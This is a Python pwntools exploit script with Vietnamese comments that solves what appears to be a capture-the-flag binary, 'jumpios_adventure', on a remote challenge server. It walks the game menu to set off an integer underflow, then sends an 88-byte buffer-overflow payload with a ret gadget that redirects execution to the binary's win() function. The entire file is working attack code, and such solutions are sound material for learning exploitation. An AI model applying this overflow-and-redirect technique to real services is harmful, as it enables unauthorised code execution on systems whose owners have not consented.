from pwn import *

# Cài đặt context cho binary
elf = ELF('./jumpios_adventure')
context.binary = elf

# --- CHỈNH SỬA CÁC GIÁ TRỊ NÀY NẾU CHẠY LOCAL ---
# p = process()
p = remote('94.237.48.60', 44740)
# ----------------------------------------------------

# Lấy địa chỉ của hàm win
win_addr = elf.symbols['win']
log.info(f"Address of win() function: {hex(win_addr)}")

# Tìm một ret gadget. Địa chỉ này ổn định vì chương trình không có PIE.
# Lệnh để tìm: ROPgadget --binary ./jumpios_adventure --only "ret"
ret_gadget = 0x40101a 
log.info(f"Using ret gadget at: {hex(ret_gadget)}")

# Bước 1: Chọn Play
p.sendlineafter(b'> ', b'1')
log.info("Selected [1] Play")

# Bước 2: Gây ra integer underflow để có thể thắng
p.sendlineafter(b'> ', b'4') # Use Potion
log.info("Selected [4] Use potion")
p.sendlineafter(b'> ', b'5') # RNB pot
log.info("Selected [5] RNB pot (Triggering Integer Underflow)")

# Bước 3: Đánh bại quái vật
p.sendlineafter(b'> ', b'1') # Punch
log.info("Selected [1] Punch (Defeating monster)")

# Bước 4: Gửi payload để khai thác buffer overflow
# Offset chính xác sau khi gọi hàm pots() là 88 bytes.
OFFSET = 88
padding = b'A' * OFFSET

# Payload bao gồm ret_gadget để căn chỉnh stack trước khi gọi win()
payload = padding + p64(ret_gadget) + p64(win_addr)

log.info("Sending the correct payload...")
p.sendlineafter(b'Tell me your name: ', payload)

# Nhận flag
p.interactive()